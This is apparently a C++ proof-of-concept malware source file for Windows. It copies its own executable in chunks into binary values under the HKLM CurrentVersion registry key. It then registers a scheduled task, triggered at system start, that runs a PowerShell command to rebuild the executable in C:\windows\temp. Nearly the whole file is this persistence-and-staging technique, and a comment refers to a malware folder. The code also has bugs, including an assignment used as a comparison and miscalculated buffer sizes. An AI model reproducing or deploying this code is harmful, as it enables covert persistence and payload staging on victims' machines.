// Code writes himselfe by parts of predefined size (registrySizelimit) to registy in binary format.
// Then Creates task in scheduller, that appends register keys to PE-file and writes it to C:\\windows\\temp\\

#include "stdafx.h"


int CreateTask(LPCWSTR pwszTaskName)
{
	HRESULT hr = S_OK;
	ITaskScheduler *pITS;


	/////////////////////////////////////////////////////////////////
	// Call CoInitialize to initialize the COM library and then 
	// call CoCreateInstance to get the Task Scheduler object. 
	/////////////////////////////////////////////////////////////////
	hr = CoInitialize(NULL);
	if (SUCCEEDED(hr))
	{
		hr = CoCreateInstance(CLSID_CTaskScheduler,
			NULL,
			CLSCTX_INPROC_SERVER,
			IID_ITaskScheduler,
			(void **)&pITS);
		if (FAILED(hr))
		{
			CoUninitialize();
			return 1;
		}
	}
	else
	{
		return 1;
	}


	/////////////////////////////////////////////////////////////////
	// Call ITaskScheduler::NewWorkItem to create new task.
	/////////////////////////////////////////////////////////////////
	ITask *pITask;
	IPersistFile *pIPersistFile;

	hr = pITS->NewWorkItem(pwszTaskName,         // Name of task
		CLSID_CTask,          // Class identifier 
		IID_ITask,            // Interface identifier
		(IUnknown**)&pITask); // Address of task 
							  //  interface
	
	//pITS->Release();                               // Release object
	if (FAILED(hr))
	{
		if (hr = 0x80070050) //HRESULT_FROM_WIN32 (ERROR_FILE_EXISTS)
		{
			hr = pITS->Delete(pwszTaskName);
			if (FAILED(hr))
			{
				CoUninitialize();
				fprintf(stderr, "Failed deleting task, error = 0x%x\n", hr);
				pITS->Release();                               // Release object
				return 1;
			}
			else
			{
				CoUninitialize();
				fprintf(stderr, "Old task deleted.\n", hr);
				CreateTask(pwszTaskName); //restart CreateTask function
				return 1;
			}
		}
		else
		{
			CoUninitialize();
			fprintf(stderr, "Failed calling NewWorkItem, error = 0x%x\n", hr);
			pITS->Release();                               // Release object
			return 1;
		}
	}
	

	/////////////////////////////////////////////////////////////////
	//Set Flags
	/////////////////////////////////////////////////////////////////
	pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);

	/////////////////////////////////////////////////////////////////
	//Set Comment, Name, Working dir, Params
	/////////////////////////////////////////////////////////////////
	pITask->SetComment(L"This is a comment");
	pITask->SetApplicationName(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
	pITask->SetWorkingDirectory(L"C:\\Windows\\System32\\");
	// Append PE parts from registry and write to file task
	LPCWSTR part_1 = L"-C \"	$task = '";
	LPCWSTR part_2 = L"' ;\
								$var = ((Get-ItemProperty -Path 'HKLM:\\software\\Microsoft\\Windows\\CurrentVersion\\' ) | select $task*) ;\
								$i = 0 ;\
								$bin = $null ;\
								DO \
								{ \
									$obj = $task + $i ;\
									if ($var.$obj.length -gt 0) \
									{ \
										$bin += $var.$obj \
									} \
									$i += 1 \
								} WHILE($var.$obj.length -gt 0) ;\
								[io.file]::WriteAllBytes('C:\\windows\\temp\\' + $task + '.exe', $bin)\"";
	double parametersSize = (wcslen(part_1) + wcslen(pwszTaskName) + wcslen(part_2)) * sizeof(LPCWSTR);
	wchar_t *parameters = NULL;
	parameters = (wchar_t *)malloc(parametersSize);
	wcsncpy(parameters, part_1, wcslen(part_1) * sizeof(part_1));
	wcsncat(parameters, pwszTaskName, wcslen(pwszTaskName) * sizeof(pwszTaskName));
	wcsncat(parameters, part_2, wcslen(part_2) * sizeof(part_2));
	
	pITask->SetParameters(parameters); // part_1 + pwszTaskName + part_2

	//pITask->SetParameters(L"-C \"[io.file]::WriteAllBytes('C:\\malware\\CreateTask_2.exe', [io.file]::ReadAllBytes('C:\\malware\\CreateTask.exe'))\"");

	///////////////////////////////////////////////////////////////////
	// Call ITask::CreateTrigger to create new trigger.
	///////////////////////////////////////////////////////////////////

	ITaskTrigger *pITaskTrigger;
	WORD piNewTrigger;
	hr = pITask->CreateTrigger(&piNewTrigger,
		&pITaskTrigger);
	if (FAILED(hr))
	{
		wprintf(L"Failed calling ITask::CreatTrigger: ");
		wprintf(L"error = 0x%x\n", hr);
		pITask->Release();
		CoUninitialize();
		return 1;
	}

	//////////////////////////////////////////////////////
	// Define TASK_TRIGGER structure. Note that wBeginDay,
	// wBeginMonth, and wBeginYear must be set to a valid 
	// day, month, and year respectively.
	//////////////////////////////////////////////////////

	TASK_TRIGGER pTrigger;
	ZeroMemory(&pTrigger, sizeof(TASK_TRIGGER));

	SYSTEMTIME lpSystemTime;
	GetLocalTime(&lpSystemTime);


	// Add code to set trigger structure?
	pTrigger.wBeginDay = lpSystemTime.wDay;                  // Required
	pTrigger.wBeginMonth = lpSystemTime.wMonth;                // Required
	pTrigger.wBeginYear = lpSystemTime.wYear;              // Required
	pTrigger.cbTriggerSize = sizeof(TASK_TRIGGER);
	pTrigger.wStartHour = lpSystemTime.wHour;
	pTrigger.wStartMinute = lpSystemTime.wMinute + 2;
	//pTrigger.TriggerType = TASK_TIME_TRIGGER_DAILY;
	pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;
	pTrigger.Type.Daily.DaysInterval = 1;


	///////////////////////////////////////////////////////////////////
	// Call ITaskTrigger::SetTrigger to set trigger criteria.
	///////////////////////////////////////////////////////////////////

	hr = pITaskTrigger->SetTrigger(&pTrigger);
	if (FAILED(hr))
	{
		wprintf(L"Failed calling ITaskTrigger::SetTrigger: ");
		wprintf(L"error = 0x%x\n", hr);
		pITask->Release();
		pITaskTrigger->Release();
		CoUninitialize();
		return 1;
	}

	///////////////////////////////////////////////////////////////////
	// Call ITask::SetAccountInformation to specify the account name
	// and the account password for Test Task.
	///////////////////////////////////////////////////////////////////
	hr = pITask->SetAccountInformation(L"",
		NULL);


	if (FAILED(hr))
	{
		wprintf(L"Failed calling ITask::SetAccountInformation: ");
		wprintf(L"error = 0x%x\n", hr);
		pITask->Release();
		CoUninitialize();
		return 1;
	}


	/////////////////////////////////////////////////////////////////
	// Call IUnknown::QueryInterface to get a pointer to 
	// IPersistFile and IPersistFile::Save to save 
	// the new task to disk.
	/////////////////////////////////////////////////////////////////

	hr = pITask->QueryInterface(IID_IPersistFile,
		(void **)&pIPersistFile);

	pITask->Release();
	if (FAILED(hr))
	{
		CoUninitialize();
		fprintf(stderr, "Failed calling QueryInterface, error = 0x%x\n", hr);
		return 1;
	}


	hr = pIPersistFile->Save(NULL,
		TRUE);
	pIPersistFile->Release();
	if (FAILED(hr))
	{
		CoUninitialize();
		fprintf(stderr, "Failed calling Save, error = 0x%x\n", hr);
		return 1;
	}


	CoUninitialize();
	printf("New task created.\n");
	return 0;
}

int BinToReg(char *source_pe, LPCWSTR pValueName) {
	UINT32 status = NO_ERROR;
	HKEY hkey = 0;
	DWORD disp;
	FILE *filePointer;
	double registrySizelimit = 500000;
	//BYTE value = 0x11;

	// Open file
	filePointer = fopen(source_pe, "rb");  // r for read, b for binary
	if (filePointer == NULL)
	{
		printf("open read file error.\n");
		return 1;
	}

	// Get file size
	fseek(filePointer, 0L, SEEK_END);
	double size = ftell(filePointer);
	double parts = ceil(size / registrySizelimit); // The smallest integral value that is not less than argument (as a floating-point value).
	rewind(filePointer); // sets the file position to the beginning of the file of the given stream

	// Allocata memory for buffer
	BYTE *pFileBuffer = (BYTE *)malloc(sizeof(BYTE)*size);

	// copy the file into the buffer:
	fread(pFileBuffer,		// Pointer to a block of memory with a size of at least (size*count) bytes, converted to a void*.
		1,					// Size, in bytes, of each element to be read. size_t is an unsigned integral type.
		size,				// Number of elements, each one with a size of size bytes. size_t is an unsigned integral type.
		filePointer);		// Pointer to a FILE object that specifies an input stream.

	fclose(filePointer);
	status = RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, &disp);
	if (status != 0)
	{
		printf("Can not read registry. Error: %zu\n", status);
		return 1;
	}

	
	printf("Parts: %.f\n", parts);

	int rsl = registrySizelimit;
	int tail = int(size) % int(registrySizelimit);

	int keySize = wcslen(pValueName)*sizeof(pValueName) + sizeof(parts);
	wchar_t *keyWithIndex = NULL;
	keyWithIndex = (wchar_t *)malloc(sizeof(wchar_t)*keySize);
	
	// Split file buffer to parts
	for (int i = 0; i < (parts-1); i++) 
	{
		// Problems with dynamic array, so I use static (index[256])
		//wchar_t *index = NULL;
		//index = (wchar_t *)calloc(i+2, sizeof(wchar_t *));

		wchar_t index[256];
		swprintf_s(index, L"%d", i); // Convert int to wchar_t
		// Concat strings key with index
		wcsncpy(keyWithIndex, pValueName, wcslen(pValueName)*sizeof(pValueName));
		wcsncat(keyWithIndex, index, sizeof(parts));
		status = RegSetValueEx(hkey, keyWithIndex, 0, REG_BINARY, (BYTE *)(pFileBuffer + rsl*i), rsl);
		if (status != 0)
		{
			printf("Status: %zu", status);
			return 1;
		}
		printf("Register value with name '%ls' created\n", keyWithIndex);
	}
	wchar_t index[256];
	swprintf_s(index, L"%d", int(parts) - 1); // convert int to wchar_t
	// Concat strings key with index
	wcsncpy(keyWithIndex, pValueName, wcslen(pValueName) * sizeof(pValueName));
	wcsncat(keyWithIndex, index, sizeof(parts));
	status = RegSetValueEx(hkey, keyWithIndex, 0, REG_BINARY, (BYTE *)(pFileBuffer + rsl*(int(parts)-1)), tail);
	if (status != 0)
	{
		printf("Status: %zu", status);
		return 1;
	}
	printf("Register value with name '%ls' created\n", keyWithIndex);

	free(keyWithIndex);
	RegCloseKey(hkey);
	free(pFileBuffer);
	return 0;
}

int CheckReg(LPCWSTR pValueName)
{
	UINT32 status = NO_ERROR;
	HKEY hkey = 0;
	DWORD disp;
	int i = 0;
	wchar_t index[256];

	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,				//hKey
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",	//lpSubKey
		NULL,												//ulOptions
		KEY_WRITE,											//samDesired
		&hkey);												//phkResult

	if (status != 0)
	{
		printf("Can not read registry. Error: %zu\n", status);
		return 1;
	}

	int volumeSize = (wcslen(pValueName) + sizeof(i)) * sizeof(pValueName);
	wchar_t *volumeWithIndex = NULL;
	volumeWithIndex = (wchar_t *)malloc(sizeof(wchar_t)*volumeSize);

	while (status == 0) 
	{
		double size_1 = sizeof(index);
		swprintf_s(index, L"%d", i); // convert int to wchar_t
		wcsncpy(volumeWithIndex, pValueName, wcslen(pValueName) * sizeof(pValueName));
		wcsncat(volumeWithIndex, index, sizeof(double));


		status = RegDeleteValue(hkey, volumeWithIndex);
		if (status != 0)
		{
			if (status == 2)
			{
				printf("Register value not found: '%ls'\n", volumeWithIndex);
				return 0;
			}
			printf("Register value delete error: %zu\n", status);
			return 1;
		}
		printf("Register volume delited: '%ls'\n", volumeWithIndex);
		i++;
	}
	return 0;
}

int main(int argc, char **argv)
{
	 LPCWSTR pwszTaskName = L"Test Task2"; //name of new task, registry key and PE-file

	CreateTask(pwszTaskName);
	if (CheckReg(pwszTaskName) == 0) 
	{
		BinToReg(argv[0], pwszTaskName);
	}
}